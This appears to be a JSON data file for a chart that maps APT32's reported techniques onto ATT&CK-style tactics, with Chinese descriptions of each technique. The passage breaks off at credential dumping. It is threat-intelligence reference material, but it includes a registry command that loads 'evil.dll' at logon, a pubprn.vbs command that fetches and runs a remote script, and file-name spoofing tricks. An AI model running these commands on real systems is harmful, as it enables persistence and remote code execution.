{
  "data": [
    {
      "name": "初始接入",
      "itemStyle": {
        "color": "#8D419B"
      },
      "date": "",
      "value": "",
      "detail": "初始接入战术包含一系列技术，这些技术利用各种入口向量帮助攻击者获得初始驻留据点。能够用于获取驻留据点的技术既包括针对性的钓鱼攻击，也包括利用面向公众的WEB服务器的缺陷。通过初始接入战术获得的驻留据点可以允许继续访问，例如使用有效账户或外部远程服务，也可以通过修改口令而被限制使用。\n",
      "children": [
        {
          "name": "由攻陷网站驱动",
          "itemStyle": {
            "color": "#334FEB"
          },
          "date": "2018-03-13",
          "value": "",
          "detail": "        由攻陷网站驱动就是当攻击者在用户正常浏览网页的过程中接入该系统。使用此技术，用户的浏览器将会成为攻击目标。\n向浏览器发送漏洞代码的方式有多种，包括：\n1、合法的网站会受到攻击，攻击者会注入某种形式的恶意代码，如JavaScript、iFrames、跨站点脚本。\n2、恶意广告是通过合法的广告提供商付费和服务的。\n3、内置的web应用程序界面可用于插入任何其他类型的对象，这些对象可用于显示web内容或包含在访问客户端上执行的脚本（例如论坛帖子、评论和其他用户可控制的web内容）。\n        通常，攻击者使用的网站是特定团体（如政府、特定行业或地区）访问的网站，其目标是基于共同利益损害特定用户或一组用户。这种有针对性的攻击是指一种战略性的网络妥协或水坑攻击。有几个已知的例子说明了这一点。\n典型的有共享网站驱动的例子：\n1、用户访问一个网站，该网站被用来托管对手控制的内容。\n2、脚本会自动执行，通常会搜索浏览器和插件的版本以查找可能存在漏洞的版本。\n        (1) 可能需要用户通过启用脚本或活动网站组件并忽略警告对话框来协助此过程。\n3、找到易受攻击的版本后，利用漏洞的代码将传递到浏览器。\n4、如果攻击成功，则除非有其他保护措施，否则将在用户系统上执行敌方代码。\n        (1) 在某些情况下，在发送攻击代码之前，需要在初始扫描之后再次访问网站。\n        与利用公众应用不同的是，此技术的重点是在访问网站时利用客户端上的软件。这通常会让攻击者访问内部网络上的系统，而不是DMZ中的外部系统。",
          "children": [
            {
              "name": "APT32会使用诱骗受害者访问已经攻陷的水坑网站的方式实现对目标的初始感染。",
              "itemStyle": {
                "color": "#885866"
              },
              "date": "2018-03-13",
              "value": "1",
              "detail": ""
            }
          ]
        },
        {
          "name": "附件钓鱼",
          "itemStyle": {
            "color": "#0AF637"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        鱼叉式网络钓鱼附件是鱼叉式网络钓鱼的一种特殊变体。鱼叉式网络钓鱼附件不同于其他形式的鱼叉式网络钓鱼，因为它使用附加在电子邮件上的恶意软件。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社会工程。在这种情况下，攻击者会在鱼叉式网络钓鱼电子邮件中附加一个文件，通常依靠用户执行来获得执行权。 \n        附件有许多选项，如Microsoft Office文档、可执行文件、pdf或存档文件。一旦打开附件(并可能点击过去的保护)，攻击者的有效负载会利用漏洞或直接在用户系统上执行。鱼叉式网络钓鱼电子邮件的文本通常试图给出一个合理的理由来解释为什么应该打开该文件，并可能解释如何绕过系统保护。电子邮件还可能包含如何解密附件(如zip文件密码)的说明，以规避电子邮件边界防御。攻击者经常操纵文件扩展名和图标，以使附加的可执行文件看起来像是文档文件，或者利用一个应用程序的文件看起来像是另一个应用程序的文件。",
          "children": [
            {
              "name": "APT32会发送带有恶意代码并伪装成文档或电子表格的电子邮件实现对目标的初始感染。",
              "itemStyle": {
                "color": "#960F03"
              },
              "date": "2017-05-24",
              "value": "2",
              "detail": ""
            }
          ]
        },
        {
          "name": "链接钓鱼",
          "itemStyle": {
            "color": "#10143E"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        带链接的鱼叉式网页钓鱼是鱼叉式网页钓鱼的一种特殊变种。它与其他形式的鱼叉式网络钓鱼不同之处在于它使用链接来下载电子邮件中包含的恶意软件，而不是将恶意文件附加到电子邮件本身，以避免可能检查电子邮件附件的防御。\n        所有形式的鱼叉式网络钓鱼都是以电子方式提供的针对特定个人，公司或行业的社会工程。在这种情况下，恶意电子邮件包含链接。通常，链接将伴随社会工程文本，并要求用户主动点击或复制并将URL粘贴到浏览器中，从而利用用户执行。被访问的网站可能使用漏洞攻击来破坏Web浏览器，或者将首先根据电子邮件的借口提示用户下载应用程序、文档、zip文件甚至可执行文件。攻击者还可以包括旨在与电子邮件阅读器直接交互的链接，包括旨在直接利用终端系统的嵌入式图像或验证电子邮件的接收（即网络错误/网络信标）。",
          "children": [
            {
              "name": "APT32会发送带有恶意链接的电子邮件实现对目标的初始感染。",
              "itemStyle": {
                "color": "#A90745"
              },
              "date": "2017-05-24",
              "value": "3",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "维持",
      "itemStyle": {
        "color": "#CB703D"
      },
      "date": "",
      "value": "",
      "detail": "维持战术包含一系列技术，攻击者利用这些技术在系统重启、凭据更改或者其他可能切断其访问的中断因素发生后，仍然能恢复对目标系统的访问。用于维持战术的技术包括能够帮助攻击者维持驻留据点的任何访问、操作或配置更改，例如替换或劫持合法代码或添加启动代码。\n",
      "children": [
        {
          "name": "修改现有服务",
          "itemStyle": {
            "color": "#525C15"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        Windows服务配置信息（包括服务可执行文件或恢复程序/命令的文件路径）存储在注册表中。可以使用sc.exe和Reg等实用程序修改服务配置。\n        攻击者可以使用系统实用程序或使用自定义工具与Windows API进行交互来修改现有服务以在系统上保留恶意软件。使用现有服务是一种伪装，可能使取证分析更具挑战性。修改现有服务可能会中断其功能，或者可能启用已禁用或不常用的服务。\n        攻击者还可能故意破坏或终止服务以执行恶意恢复程序/命令。",
          "children": [
            {
              "name": "APT32会修改Windows的服务以确保在受控系统能够运行PowerShell脚本。",
              "itemStyle": {
                "color": "#945024"
              },
              "date": "2017-05-24",
              "value": "13",
              "detail": ""
            }
          ]
        },
        {
          "name": "计划任务",
          "itemStyle": {
            "color": "#24E004"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "        诸如at和schtasks之类的实用程序，以及windows任务调度程序，可用于调度在某个日期和时间执行的程序或脚本。只要满足使用RPC的适当身份验证，并且打开了文件和打印机共享，也可以在远程系统上计划任务。在远程系统上计划任务通常需要是远程系统上administrators组的成员。\n        攻击者可以使用任务调度在系统启动时执行程序，或在计划的基础上执行程序以实现持久性，作为横向移动的一部分进行远程执行，以获得系统权限，或在指定帐户的上下文中运行进程。",
          "children": [
            {
              "name": "APT32会使用创建计划任务的方法实现在受害主机中的持续驻留。",
              "itemStyle": {
                "color": "#ADD2A9"
              },
              "date": "2017-05-14",
              "value": "17",
              "detail": ""
            }
          ]
        },
        {
          "name": "注册表启动项/启动文件夹",
          "itemStyle": {
            "color": "#286488"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        在注册表或启动文件夹中向“运行键”添加条目将导致在用户登录时执行引用的程序。这些程序将在用户的上下文中执行，并具有帐户的关联权限水平。\nWindows系统上默认创建以下运行键：\n1、HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n2、HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n3、HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n4、HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\n也是可用的，但默认情况下不会在Windows Vista和更新版本上创建。注册表运行键条目可以直接引用程序或将它们列为依赖项列出。例如，可以使用带有RunOnceEx的“Depend”键在登录时加载DLL：reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \n以下注册表项可用于设置持久性的启动文件夹项：\n1、HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders \n2、HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders \n3、HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders \n4、HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n        攻击者可以使用这些配置位置来执行恶意软件，例如远程访问工具，以通过系统重新启动来维持持久性。攻击者还可以使用伪装来使注册表项看起来好像与合法程序相关联。",
          "children": [
            {
              "name": "APT32使用了注册表启动项建立持久性，既可以用于启动PowerShell和VBS脚本，也可以直接启动后门程序。",
              "itemStyle": {
                "color": "#D6B7E9"
              },
              "date": "2017-05-24",
              "value": "16",
              "detail": ""
            }
          ]
        },
        {
          "name": "Office应用启动",
          "itemStyle": {
            "color": "#684CF4"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        Microsoft Office是企业网络中基于Windows的操作系统上相当常见的应用程序套件。在启动办公软件时，有许多机制可与office一起用于持久性。\n办公室模板宏(Office Template Macros)：\n        Microsoft Office包含的模板是常见Office应用程序的一部分，用于自定义样式。每次应用程序启动时都会使用应用程序中的基本模板。\n        Office Visual Basic for Applications（VBA）宏可以插入到基础的模板中，并在相应的Office应用程序启动时执行代码以获得持久性。目前已经发现并发布了Word和Excel的示例。默认情况下，Word创建的Normal.dotm模板可以修改为包含恶意宏。Excel没有默认创建的模板文件，但可以添加一个将自动加载的模板文件。 \nWord Normal.dotm位置：C:\\Users(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\nExcel Personal.xlsb位置：C:\\Users(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB\n        攻击者可能需要根据使用宏是的系统或者企业安全策略，使宏能够不受限制地执行。\n办公室测试(Office Test)：\n        发现一个注册表位置，当DLL引用放在其中时，每次启动Office应用程序时都会执行二进制路径指向的相应DLL \nHKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\n加载项(Add-ins)：\n        Office加载项可用于向Office程序添加功能。\n        加载项也可用于获取持久性，因为它们可以设置为在Office应用程序启动时执行代码。各种Office产品可以使用不同类型的加载项;包括Word / Excel加载项库（WLL / XLL），VBA加载项，Office组件对象模型（COM）加载项，自动化加载项，VBA编辑器（VBE），用于Office的Visual Studio工具（VSTO）加载项和Outlook加载项。 \n\nOutlook规则，表单和主页(Outlook Rules, Forms, and Home Page)：\n        Outlook中发现了一些可以滥用以获取持久性的功能，例如Outlook规则，表单和主页。\n        Outlook规则允许用户定义自动行为来管理电子邮件。例如，良性规则可能会自动将电子邮件移动到Outlook中的特定文件夹（如果它包含来自特定发件人的特定表单）。可以创建恶意Outlook规则，当攻击者向该用户发送特制的电子邮件时，可以触发代码执行。\n        Outlook表单用作Outlook邮件中的演示文稿和功能的模板。可以创建自定义Outlook表单，当攻击者使用相同的自定义outlook表单发送精心编制的电子邮件时,该表单将执行代码。\n        Outlook主页是用于自定义Outlook文件夹的演示文稿的旧功能。此功能允许在打开文件夹时加载和显示内部或外部URL。可以制作恶意HTML页面，该页面将在Outlook主页加载时执行代码。\n        要滥用这些功能，攻击者需要事先通过Exchange / OWA服务器或客户端应用程序访问用户的Outlook邮箱。一旦恶意规则，表单或主页已添加到用户的邮箱，它们将在Outlook启动时加载。当加载/重新加载正确的Outlook文件夹时将执行恶意主页，而当攻击者向用户发送特制的电子邮件时将执行恶意规则和表单。 ",
          "children": [
            {
              "name": "APT32在Microsoft Outlook中安装了一个用于持久驻留的后门宏。",
              "itemStyle": {
                "color": "#D6F6F9"
              },
              "date": "2017-05-24",
              "value": "15",
              "detail": ""
            }
          ]
        },
        {
          "name": "Web Shell",
          "itemStyle": {
            "color": "#DCC202"
          },
          "date": "2017-11-06",
          "value": "",
          "detail": "        Web shell是一个Web脚本，放置在可公开访问的Web服务器上，允许攻击者将Web服务器用作网络的网关。Web shell可以提供一组要执行的功能，或者在托管Web服务器的系统上提供命令行界面。除了服务器端脚本之外，Web shell可能还有一个客户端接口程序，用于与Web服务器通信（例如，参见 中国菜刀Web shell客户端）。\n        如果检测到并删除了攻击者的主要访问方法，则Web shell可以充当冗余访问通道或持久性机制。",
          "children": [
            {
              "name": "APT32使用Web Shell维护对攻陷网站的访问。",
              "itemStyle": {
                "color": "#801006"
              },
              "date": "2017-11-06",
              "value": "18",
              "detail": ""
            }
          ]
        },
        {
          "name": "创建新服务",
          "itemStyle": {
            "color": "#903C88"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        当操作系统启动时，它们可以启动称为执行后台系统功能的服务程序或应用程序。服务的配置信息（包括服务可执行文件的文件路径）存储在Windows注册表中。\n        攻击者可以安装一个新服务，该服务可以配置为在启动时通过使用实用程序与服务交互或直接修改注册表来执行。可以使用来自相关操作系统的名称或使用伪装的良性软件来伪装服务名称。可以使用管理员权限创建服务，但是在SYSTEM权限下执行服务，因此攻击者也可以通过服务将权限从管理员升级到SYSTEM。此外，攻击者也可以通过服务执行直接启动服务。",
          "children": [
            {
              "name": "APT32会在受控主机中创建新服务实现持续驻留。",
              "itemStyle": {
                "color": "#6AFEDB"
              },
              "date": "2017-05-24",
              "value": "14",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "权限提升",
      "itemStyle": {
        "color": "#6720EE"
      },
      "date": "",
      "value": "",
      "detail": "权限提升战术包含一系列技术，攻击者利用这些技术能够在系统或者网络中获得更高级别的权限。攻击者通常可以进入和探测具有非特权访问限制的网络，但仍需提升权限才能达成后续目标。常用方法是利用系统的缺陷、错误配置和漏洞。提升后访问权限包括:\n•SYSTEM / root级别\n•本地管理员\n•具有管理员权限的用户账户\n•具有特定系统访问权限或执行特定功能的用户账户\n这些技术通常与维持战术的技术相重叠，因为帮助攻击者实现持续驻留的操作系统特性也同时满足了更高级别的执行上下文环境。",
      "children": [
        {
          "name": "有效账户",
          "itemStyle": {
            "color": "#216422"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "        攻击者可以使用凭证访问技术窃取特定用户或服务帐户的凭据，或者通过社交工程捕获其侦察过程中的凭据以获取初始访问权限。\n        攻击者可能使用的帐户可分为三类：默认帐户，本地帐户和域帐户。默认帐户是内置到操作系统中的帐户，例如Windows系统上的访客或管理员帐户或其他类型的系统，软件或设备上的默认工厂(提供商)帐户。本地帐户是由组织配置以供用户，远程支持，服务或单个系统或服务上的管理使用的帐户。域帐户是由活动目录域服务管理的帐户，其中访问和权限是在属于该域的系统和服务之间配置的。域帐户可以涵盖用户，管理员和服务。\n        受损的凭据可用于绕过对网络内系统上的各种资源的访问控制，甚至可用于对远程系统和外部可用服务（如VPN，Outlook Web Access和远程桌面）的持久访问。受损的凭据还可以向攻击者授予对特定系统或对网络的受限区域的访问权限。攻击者在使用时可以选择不将恶意软件或工具与这些凭据提供的合法访问结合，以使其更难以检测其存在。\n        默认帐户也不限于客户端计算机上的访客和管理员，它们还包括为网络设备和计算机应用程序等预设的帐户，无论它们是内部的，开源的还是COTS。预设有用户名和密码组合的设备对安装后不进行更改的组织部分能够构成严重威胁，因为它们很容易成为攻击者的目标。同样，攻击者还可以利用公开披露的私钥或被盗的私钥，通过远程服务合法地连接到远程环境。\n        帐户访问、凭据和权限在系统网络中的重叠是令人担忧的，因为攻击者可能在帐户和系统之间切换，以达到较高的访问级别（即域或企业管理员），从而绕过企业内设置的访问控制。",
          "children": [
            {
              "name": "APT32会利用本地合法的管理员账户凭据提升权限。",
              "itemStyle": {
                "color": "#AC6F5D"
              },
              "date": "2017-05-14",
              "value": "20",
              "detail": ""
            }
          ]
        },
        {
          "name": "漏洞利用提升权限",
          "itemStyle": {
            "color": "#D6AB5E"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "         当攻击者利用程序、服务、操作系统软件或内核本身执行攻击者代码时出现的错误，就会出现利用软件漏洞。安全结构(如权限级别)通常会阻碍对信息的访问和某些技术的使用，因此攻击者可能需要执行权限提升，包括使用软件利用技术来规避这些限制。\n        当最初获得对系统的访问时，攻击者可能在权限较低的进程中操作，这将阻止他们访问系统上的某些资源。通常在较高权限下运行的操作系统组件和软件中可能存在漏洞，可利用这些漏洞在系统上获得更高级别的访问权限。这可能使人能够根据易受攻击的组件，从非特权权限或用户权限转移到系统权限或root权限。对于已正确配置并限制其他权限提升方法的终端系统，这可能是对手必须采取的步骤。",
          "children": [
            {
              "name": "APT32使用CVE-2016-7255漏洞获得系统权限，实现提权。",
              "itemStyle": {
                "color": "#765567"
              },
              "date": "2017-05-14",
              "value": "19",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "防御规避",
      "itemStyle": {
        "color": "#36B0A8"
      },
      "date": "",
      "value": "",
      "detail": "防御规避战术包含一系列技术，攻击者利用这些技术在整个入侵过程中躲避检测。用于防御规避的技术包括卸载、禁用安全软件或者混淆、加密数据和脚本。攻击者还会权衡和利用可信进程隐藏和伪装其恶意软件。如果其他战术使用的技术包含了干扰或破坏防御的额外效用，也被归为此战术。\n",
      "children": [
        {
          "name": "隐藏文件和目录",
          "itemStyle": {
            "color": "#DADD55"
          },
          "date": "2019-04-09",
          "value": "",
          "detail": "        为了防止普通用户意外更改系统上的特殊文件，大多数操作系统都具有“隐藏”文件的概念。当用户使用GUI浏览文件系统或在命令行上使用普通命令时，这些文件不会显示。用户必须明确要求通过一系列图形用户界面（GUI）提示或命令行开关（dir /a对于Windows以及ls -a Linux和macOS）显示隐藏文件。\n        攻击者可以利用这一点来隐藏系统中任何位置的文件和文件夹，以便持久化并规避不包含隐藏文件调查的典型用户或系统分析。\nWindows：\n        用户可以使用attrib.exe二进制文件将特定文件标记为隐藏。只需执行“attrib+h filename”将文件或文件夹标记为隐藏。类似地，“+s”将文件标记为系统文件，“+r”标记将文件标记为只读。与大多数Windows二进制文件一样，attrib.exe二进制文件提供了递归应用这些更改“/s”的能力。\nLinux/Mac：\n        用户只需将“.”作为文件或文件夹名中的第一个字符，即可将特定文件标记为隐藏。默认情况下，以句点“.”开头的文件和文件夹在finder应用程序和标准命令行实用程序（如“ls”）中不被查看。用户必须专门更改设置才能查看这些文件。对于命令行用法，通常有一个标志来查看所有文件（包括隐藏的文件）。要在finder应用程序中查看这些文件，必须执行以下命令：defaults write com.apple.finder appleshowallfiles yes，然后重新启动Finder应用程序。\nMac：\n        MacOS上的文件可以用UF_HIDDEN标志进行标记，以防止在finder.app中看到这些文件，但仍允许在terminal.app中看到这些文件。许多应用程序创建这些隐藏的文件和文件夹以存储信息，这样就不会扰乱用户的工作区。例如，SSH实用程序创建一个隐藏的.ssh文件夹，其中包含用户的已知主机和密钥。",
          "children": [
            {
              "name": "APT32的MacOS后门通过调用chflags函数隐藏clientid文件。",
              "itemStyle": {
                "color": "#4BBE90"
              },
              "date": "2019-04-09",
              "value": "25",
              "detail": ""
            }
          ]
        },
        {
          "name": "伪装",
          "itemStyle": {
            "color": "#478F39"
          },
          "date": "2017-05-14",
          "value": "",
          "detail":"        当一个可执行文件的名称或位置(合法的或恶意的)被操纵或滥用以逃避防御和观察时，就会发生伪装。目前已经发现这种技术的几种不同变体。\n        一种变体是将可执行文件放置在通常受信任的目录中，或者给出合法可信程序的名称。另外，给出的文件名可能是合法程序的近似值或其他无害值。这种情况的一个示例是移动和重命名公共系统实用程序或其他程序以避免基于其使用情况进行检测。这样做是为了通过依赖文件名或路径来绕过信任可执行文件的工具，以及通过将名称与被认为合法的文件相关联，来欺骗防御者和系统管理员认为文件是良性的。\n        第三种变体使用从右到左覆盖（RTLO或RLO）字符（U + 202E）作为诱使用户执行他们认为的良性文件类型但实际上是可执行代码的方法。RTLO是一种非打印字符，可使其后面的文本反向显示。例如，名为的Windows屏幕保护程序文件March 25 \n‮xcod.scr将显示为March 25 rcs.docx；名为photo_high_renn‮gnp.js的JavaScript文件将显示为photo_high_resj.png。这种技术的一个常见用途是使用鱼叉式钓鱼附件，它会欺骗最终用户和防御者，因为如果他们不知道他们的工具如何显示和呈现RTLO字符。在许多有针对性的入侵企图和犯罪活动中都可以看到使用RTLO字符。RTLO也可以在Windows注册表中使用，其中regedit.exe显示反转的字符，但默认情况下命令行工具reg.exe不显示。",
          "children": [
            {
              "name": "APT32会使用隐藏或者不可打印的特殊字符来伪装系统中特定文件的文件名，例如在在合法的服务名后面附加一个Unicode不间断空格字符。伪装的技巧还用于将pubprn.vbs移动并重重命为.txt后缀，从而躲避检测。此外，APT32还将netcat二进制文件重命名为kb-10233.exe，伪装成Windows的更新文件。",
              "itemStyle": {
                "color": "#36A83E"
              },
              "date": "2017-05-14",
              "value": "27",
              "detail": ""
            }
          ]
        },
        {
          "name": "主机特征移除",
          "itemStyle": {
            "color": "#B26F06"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "        攻击者可能删除或修改主机系统上生成的构件，包括日志和可能捕获的文件，例如隔离的恶意软件。日志的位置和格式会有所不同，但是典型的有机系统日志会被捕获为Windows事件或Linux/macOS文件，比如Bash历史记录和/var/log/*。\n        干扰事件操作以及其他可用于检测入侵活动的通知可能会破坏安全解决方案的完整性，从而导致事件无法报告。由于缺乏足够的数据来确定事件发生的情况，这些操作还可能是得取证和应急响应更加困难。",
          "children": [
            {
              "name": "APT32会清空受控主机系统中指定事件的日志记录。",
              "itemStyle": {
                "color": "#FBBDBC"
              },
              "date": "2017-05-14",
              "value": "26",
              "detail": ""
            }
          ]
        },
        {
          "name": "已签名脚本代理执行",
          "itemStyle": {
            "color": "#9B98D4"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "        使用受信证书签名的脚本可用于代理恶意文件的执行。此行为可能会绕过签名验证限制和不考虑使用这些脚本的应用程序白名单解决方案。\n        PubPrn.vbs由微软签署,可用于从远程站点代理执行。\n        示例命令：\n        cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png\n        还有其他几个签名脚本可以以类似的方式使用。",
          "children": [
            {
              "name": "APT32在执行脚本中使用了微软已经签名的pubprn.vbs来执行恶意软件，达到绕过防御检测的目的。",
              "itemStyle": {
                "color": "#EC072F"
              },
              "date": "2017-05-14",
              "value": "31",
              "detail": ""
            }
          ]
        },
        {
          "name": "时间戳篡改",
          "itemStyle": {
            "color": "#5A7702"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "        Timestomping是一种修改文件时间戳（修改、访问、创建和更改时间）的技术，通常用于模拟同一文件夹中的文件。例如，这是在已经被攻击者修改或创建的文件上完成的，这样它们就不会被司法调查员或文件分析工具发现。",
          "children": [
            {
              "name": "APT32会修改计划任务原始XML的时间戳。APT32还会修改漏洞利用中使用的中间文件的创建时间，以匹配kernel32.dll的创建时间。此外，APT32还使用了一个随机值来修改存储clientid文件的时间戳。",
              "itemStyle": {
                "color": "#CBF64E"
              },
              "date": "2017-05-14",
              "value": "33",
              "detail": ""
            }
          ]
        },
        {
          "name": "DLL旁路加载",
          "itemStyle": {
            "color": "#10F803"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "         程序可以指定在运行时加载的DLL。如果程序不正确或含糊地指定所需的DLL，则可能会出现加载意外DLL的漏洞。当Windows并排(WinSxS)清单对要加载的DLL的特性不够明确时，就会特别容易出现并行加载漏洞。攻击者可能利用易受侧加载攻击的合法程序来加载恶意DLL。\n        攻击者可能会利用这种技术来掩盖他们在合法、可信的系统或者软件进程中进行的操作。",
          "children": [
            {
              "name": "APT32首先运行一个合法签名的程序 ，然后使用DLL旁路加载的方式运行恶意DLL，从而规避Symantec和McAfee的查杀。",
              "itemStyle": {
                "color": "#D84E32"
              },
              "date": "2017-05-24",
              "value": "22",
              "detail": ""
            }
          ]
        },
        {
          "name": "修改注册表",
          "itemStyle": {
            "color": "#D40C2F"
          },
          "date": "2019-03-20",
          "value": "",
          "detail": "        攻击者可以与Windows注册表进行交互以隐藏注册表项中的配置信息，删除信息作为清理的一部分，或作为其他技术的一部分来支持持久性和执行。\n        访问注册表的特定区域取决于帐户权限，有些需要管理员级别的访问权限。内置的Windows命令行实用程序Reg可用于本地或远程注册表修改。也可以使用其他工具，例如远程访问工具，它可能包含通过Windows API与注册表交互的功能（参见示例）。\n        注册表修改还可能包括隐藏键的操作，例如使用空字符添加键名称，这将导致错误或在使用Win32 API 通过Reg或其他实用程序读取时被忽略。攻击者可能会滥用这些伪隐藏密钥来隐藏用于建立持久性的有效负载/命令。\n        远程系统的注册表可以作为横向移动的一部分进行修改，以帮助执行文件。它需要远程Registry服务在目标系统上运行。通常需要有效的帐户，以及访问远程系统的Windows 管理共享以进行RPC通信。",
          "children": [
            {
              "name": "APT32通过修改受控系统的注册表来存储后门的配置信息。",
              "itemStyle": {
                "color": "#CB2CE3"
              },
              "date": "2019-03-20",
              "value": "28",
              "detail": ""
            }
          ]
        },
        {
          "name": "文件删除",
          "itemStyle": {
            "color": "#CB987C"
          },
          "date": "2019-04-09",
          "value": "",
          "detail": "        恶意软件、工具或其他非本机文件简被攻击者丢弃或创建在系统上，可能会留下在网络中所作事情和如何做的痕迹。攻击者可能在入侵过程中删除这些文件以保持其占有减小的空间，或者在入侵后清理痕迹的过程中删除。\n        主机操作系统提供了可用于执行清理的工具，但攻击者也可以使用其他工具。示例包括本机cmd功能（如DEL），安全删除工具（如Windows Sysinternals SDelete）或其他第三方文件删除工具。",
          "children": [
            {
              "name": "APT32的MacOS后门在接收到“delete”命令后，能够自删除。",
              "itemStyle": {
                "color": "#9F7855"
              },
              "date": "2019-04-09",
              "value": "23",
              "detail": ""
            }
          ]
        },
        {
          "name": "文件或信息混淆",
          "itemStyle": {
            "color": "#8B533C"
          },
          "date": "2017-05-14",
          "value": "",
          "detail": "        攻击者可能试图通过加密，编码或以其他方式混淆系统上或传输中的内容来使可执行文件或文件难以被发现或分析。这是一种常见的行为，可以在不同平台和网络中使用以逃避防御。\n        有效载荷可能被压缩、存档或加密以避免检测。这些有效载荷也可能用于初始接入或后期横向移动以规避检测。有时可能需要用户的操作来打开和解密文件或信息以供用户执行。用户也可能需要输入密码以打开由攻击者提供的受密码保护的压缩/加密文件。攻击者还可以使用压缩或归档的脚本，例如JavaScript。\n        还可以对部分文件进行编码以隐藏纯文本字符串，否则这些字符串将帮助防御者进行发现。有效载荷也可能被分成单独的，看似良性的文件，这些文件只有在重新组装时才会显示恶意功能。\n        攻击者还可以混淆从有效载荷或直接通过命令行界面执行的命令。环境变量、别名、字符和其他平台/语言特定语义可用于规避基于签名的检测和白名单机制。 \n        伪装的另一个例子是使用隐写术，一种隐藏图像、音轨、视频剪辑或文本文件中的消息或代码的技术。第一个被熟知和报道的攻击者，所使用的就是围绕调用PSImage的隐写术活动。Duqu恶意软件从受害者的系统中加密收集的信息并将其隐藏到图像中，然后将图像展开到C2服务器。到2017年底，攻击者组使用Invoke-PSImage将PowerShell命令隐藏在图像文件（png）中，并在受害者系统上执行代码。在这种特殊情况下，PowerShell代码下载了另一个混淆的脚本，以从受害者的机器收集情报并将其传回给攻击者。",
          "children": [
            {
              "name": "APT32使用了Invoke Obfusion框架来混淆PowerShell脚本及其他代码。APT32还使用base64和一个名为“Dont-Kill-My-Cat （DKMC）”的框架对payload进行编码。此外。在MacOS后门中，APT32还对用于信息渗漏的库文件进行了AES-256-CBC方式的加密。",
              "itemStyle": {
                "color": "#A0912B"
              },
              "date": "2017-05-14",
              "value": "30",
              "detail": ""
            }
          ]
        },
        {
          "name": "软件加壳",
          "itemStyle": {
            "color": "#8EA40A"
          },
          "date": "2019-04-09",
          "value": "",
          "detail": "        软件加壳是一种压缩或加密可执行文件的方法。加壳可执行文件会更改文件签名，以避免基于签名的检测。大多数解压缩技术都会解压缩内存中的可执行代码。 \n        用于执行软件加壳的实用程序称为包装程序。加壳器的例子有MPRESS和UPX有一个更全面的已知壳厂商列表，但攻击者可能会创建自己的加壳技术，不会留下与知名壳厂商相同的工件来逃避防御。",
          "children": [
            {
              "name": "APT32使用UPX为其MacOS后门加壳。",
              "itemStyle": {
                "color": "#0D963A"
              },
              "date": "2019-04-09",
              "value": "32",
              "detail": ""
            }
          ]
        },
        {
          "name": "NTFS文件属性",
          "itemStyle": {
            "color": "#A7C67D"
          },
          "date": "2017-05-24",
          "value": "",
          "detail": "        每个新技术文件系统（NTFS）格式化分区都包含一个主文件表（MFT），它维护分区上每个文件/目录的记录。在MFT条目中有文件属性，如扩展属性（EA）和数据[当存在多个数据属性时称为备用数据流（ADS）]，可用于存储任意数据（甚至完整的文件）。 \n       攻击者可以将恶意数据或二进制文件存储在文件属性元数据中，而不是直接存储 在文件中。这可以用来逃避一些防御，例如静态指示器扫描工具和防病毒。",
          "children": [
            {
              "name": "APT32使用了NTFS备用数据流来隐藏payloads。",
              "itemStyle": {
                "color": "#72EAF8"
              },
              "date": "2017-05-24",
              "value": "29",
              "detail": ""
            }
          ]
        }
      ]
    },
    {
      "name": "凭据访问",
      "itemStyle": {
        "color": "#7FEEAF"
      },
      "date": "",
      "value": "",
      "detail": "凭据访问战术包含一系列技术，攻击者利用这些技术窃取诸如账户名称和口令等凭据。用于获取凭证的技术包括键盘记录或凭据导出等。攻击者使用合法的凭据访问系统，不仅增加了检测的难度，而且获得了创建更多账户来实现攻击意图的机会。\n",
      "children": [
        {
          "name": "内存凭据导出",
          "itemStyle": {
            "color": "#F194E8"
          },
          "date": "2017-05-24",
          "value": "",
